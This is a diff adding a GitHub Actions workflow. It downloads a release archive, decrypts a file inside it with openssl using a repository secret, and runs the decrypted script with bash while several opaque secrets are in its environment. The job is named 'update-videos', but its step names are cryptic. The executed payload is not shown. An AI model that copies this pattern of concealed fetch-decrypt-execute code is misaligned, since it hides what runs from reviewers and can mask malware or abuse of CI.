@@ -1,1 +1,57 @@
+name: fki
+on:
+  # 每天 UTC 时间 01:00 运行一次
+  # schedule:
+    # - cron: '0 1 * * *'
+  # 允许手动触发
+  workflow_dispatch:
+  
+jobs:
+  update-videos:
+    runs-on: ubuntu-latest
 
+    permissions:
+      contents: write
+      
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Download Release Asset
+        uses: robinraju/release-downloader@v1.9
+        with:
+          repository: ${{ github.repository }}
+          tag: "v0.0.1"
+          token: ${{ secrets.GITHUB_TOKEN }}
+          fileName: "ftz.tar.gz"
+
+      - name: kip
+        env:
+          SD: ${{ secrets.SD }}
+          SF: ${{ secrets.SF }}
+          YU: ${{ secrets.YU }}
+          PK: ${{ secrets.PK }}
+          BG: ${{ secrets.BG }}
+        run: |
+          sudo tar -zxvf ftz.tar.gz
+          openssl enc -d -aes-256-cbc -pbkdf2 -in data.cc -out data.txt -pass pass:$SD
+          bash data.txt
+
+      - name: Create Release
+        id: create_release
+        uses: softprops/action-gh-release@v1
+        with:
+          tag_name: v0.0.${{ github.run_number }}
+          name: "homi"
+          body: "Got it."
+          draft: false
+          prerelease: false
+          files: mferr
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          
+      - name: Commit
+        uses: stefanzweifel/git-auto-commit-action@v5
+        with:
+          commit_message: "refresh"
+          file_pattern: temp.txt
